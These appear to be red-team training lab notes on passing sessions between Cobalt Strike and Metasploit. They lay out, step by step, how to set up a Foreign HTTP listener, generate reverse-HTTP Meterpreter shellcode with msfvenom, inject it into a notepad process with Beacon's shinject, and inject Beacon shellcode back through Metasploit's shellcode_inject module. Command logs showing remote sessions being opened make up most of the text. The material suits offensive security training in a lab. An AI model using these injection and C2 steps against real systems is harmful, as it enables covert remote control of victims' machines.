Session passing is a means of spawning payloads that can talk to other Cobalt Strike listeners, or even listeners of entirely different C2 frameworks. There are many good reasons for doing this, a few examples include:

-   Leverage a capability within a framework that Cobalt Strike doesn't have.
-   Use different C2 frameworks as backup access in the event the current access is lost.
-   To emulate specific TTPs.

Beacon's staging process is based off Meterpreter's, so you can stage Meterpreter from Beacon. Cobalt Strike has a type of listener called the **Foreign Listener** designed to handle this.

On the Kali VM, launch `msfconsole` and start a new `multi/handler` using the `windows/meterpreter/reverse_http` payload.

```bash
root@kali:~# msfconsole

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://10.10.5.120:8080
```

  

In Cobalt Strike, go to **Listeners > Add** and set the **Payload** to **Foreign HTTP**. Set the **Host** to **10.10.5.120**, the **Port** to **8080** and click **Save**.

![[Pasted image 20230803170650.png]]

  

Now to spawn a Meterpreter session from Beacon, simply type `spawn <listener name>`.

```shell
beacon> spawn metasploit
[*] Tasked beacon to spawn (x86) windows/foreign/reverse_http (10.10.5.120:8080)
```

```shell
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: ofosht99) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 1 opened (10.10.5.120:8080 -> 10.10.17.231:53951)

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  DEV\bfarmer @ WKSTN-1  10.10.5.120:8080 -> 10.10.17.231:53951 (10.10.17.231)
```

  

>  **OPSEC Alert**  
You can only spawn x86 Meterpreter sessions with the foreign listener.

Alternatively, Beacon's `shinject` command can inject any arbitrary shellcode into the specified process. The process can be an existing one, or one we start with the `execute`, `run` or even `shell` commands.

Generate x64 stageless Meterpreter shellcode with `msfvenom`.

```bash
root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201308 bytes
Saved as: /tmp/msf.bin
```

  

Copy the shellcode across to the **attacker-windows** machine.

```powershell
C:\Payloads>pscp root@kali:/tmp/msf.bin .
msf.bin                   | 196 kB | 196.6 kB/s | ETA: 00:00:00 | 100%
```

  

Ensure the multi handler is setup appropriately and inject the shellcode.

```shell
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 1492  4268  notepad.exe                  x64   1           DEV\bfarmer

beacon> shinject 1492 x64 C:\Payloads\msf.bin
```

```shell
msf6 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on http://10.10.5.120:8080
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: rumczhno) Redirecting stageless connection from /N1ZSg3AJ641CWUNbIhhT5QWcTIqjJ_npAOt9u8b01bCZLPFvg0YNTQPPZpC2osS8NoHGOLaUyHHR with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] http://10.10.5.120:8080 handling request from 10.10.17.231; (UUID: rumczhno) Attaching orphaned/stageless session...
[*] Meterpreter session 2 opened (10.10.5.120:8080 -> 10.10.17.231:53793)
```

  

This same process can work in reverse, to inject Beacon shellcode from a Meterpreter session.

To generate stageless Beacon shellcode, go to `Attacks > Packages > Windows Executable (S)`, select the desired listener, select **Raw** as the **Output** type and select **Use x64 payload**.

Copy it across to the Kali VM.

```shell
C:\Payloads>pscp beacon-http.bin root@kali:/tmp/beacon.bin
beacon-http.bin           | 255 kB | 255.5 kB/s | ETA: 00:00:00 | 100%
```

  

Then use the `post/windows/manage/shellcode_inject` module to inject it into a process.

```shell
msf6 > use post/windows/manage/shellcode_inject
msf6 post(windows/manage/shellcode_inject) > set SESSION 1
msf6 post(windows/manage/shellcode_inject) > set SHELLCODE /tmp/beacon.bin
msf6 post(windows/manage/shellcode_inject) > run

[*] Running module against WKSTN-1
[*] Spawned Notepad process 4560
[+] Successfully injected payload into process: 4560
[*] Post module execution completed
```